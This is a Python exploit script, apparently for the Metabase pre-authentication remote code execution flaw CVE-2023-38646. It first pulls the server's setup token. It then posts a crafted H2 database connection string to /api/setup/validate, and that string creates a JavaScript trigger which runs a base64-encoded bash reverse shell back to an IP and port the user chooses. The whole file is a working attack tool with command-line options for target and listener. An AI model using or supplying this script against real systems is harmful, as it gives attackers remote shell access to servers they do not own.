#!/usr/bin/python3

import requests
import json
import base64
import argparse

logo = '''

_____________   ______________      _______________   ________  ________       ________    ______   ________   _____   ________ 
\_   ___ \   \ /   |_   _____/      \_____  \   _  \  \_____  \ \_____  \      \_____  \  /  __  \ /  _____/  /  |  | /  _____/ 
/    \  \/\   Y   / |    __)_  ______/  ____/  /_\  \  /  ____/   _(__  <  _______(__  <  >      </   __  \  /   |  |/   __  \  
\     \____\     /  |        \/_____/       \  \_/   \/       \  /       \/_____/       \/   --   \  |__\  \/    ^   |  |__\  \ 
 \______  / \___/  /_______  /      \_______ \_____  /\_______ \/______  /     /______  /\______  /\_____  /\____   | \_____  / 
        \/                 \/               \/     \/         \/       \/             \/        \/       \/      |__|       \/  
                                                                                                                                
'''
print(logo  + "by threatHNTR\n")

def get_setup_token_and_metabase_version(target_host):
    path = "/api/session/properties"
    url = f"{target_host}{path}"

    try:
        response = requests.get(url, verify=False)
        if response.status_code == 200:
            data = response.json()
            setup_token = data.get("setup-token")
            metabase_version = data.get("version", {}).get("tag")

            if setup_token is None:
                print("Setup token not found or is null.")
                return None, None
            else:
                print(f"Setup Token: {setup_token}")
                print(f"Version: {metabase_version}")
                return setup_token, metabase_version
        else:
            print(f"Failed to obtain the token with status code {response.status_code}")
            return None, None
    except requests.exceptions.RequestException as e:
        print(f"Exception occurred: {e}")
        print(f"Failed to connect to {target_host}.")
        return None, None


def encode_payload(ip_address_reverse, port_reverse):
    payload = f"sh -i >& /dev/tcp/{ip_address_reverse}/{port_reverse} 0>&1"
    payload_base64 = base64.b64encode(payload.encode()).decode()
    return payload_base64


def send_reverse_shell_request(target_host, setup_token, payload_base64):
    headers = {
        "Content-Type": "application/json"
    }
    shell_url = f"{target_host}/api/setup/validate"
    shell_data = {
        "token": setup_token,
        "details": {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules": {},
            "details": {
                "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload_base64}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
                "advanced-options": False,
                "ssl": True
            },
            "name": "an-sec-research-team",
            "engine": "h2"
        }
    }

    try:
        print(f"Sending POST request to {shell_url}...")
        shell_response = requests.post(shell_url, headers=headers, data=json.dumps(shell_data))
    except requests.exceptions.RequestException as e:
        print(f"Exception occurred: {e}")
        print(f"Failed to connect to {shell_url}.")
        return


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Metabase Exploit Script")
    parser.add_argument("-u", "--url", type=str, required=True, help="Target URL (e.g., http://localhost)")
    parser.add_argument("-i", "--ip", type=str, required=True, help="IP address for reverse shell")
    parser.add_argument("-p", "--port", type=str, required=True, help="Port for reverse shell")

    args = parser.parse_args()

    target_host = args.url
    print(f"Target Host: {target_host}")

    setup_token, metabase_version = get_setup_token_and_metabase_version(target_host)

    if setup_token is not None:

        ip_address_reverse = args.ip
        port_reverse = args.port

        payload_base64 = encode_payload(ip_address_reverse, port_reverse)
        print(f"Encoded Payload: {payload_base64}")

        send_reverse_shell_request(target_host, setup_token, payload_base64)
        print("Reverse shell request sent successfully.")
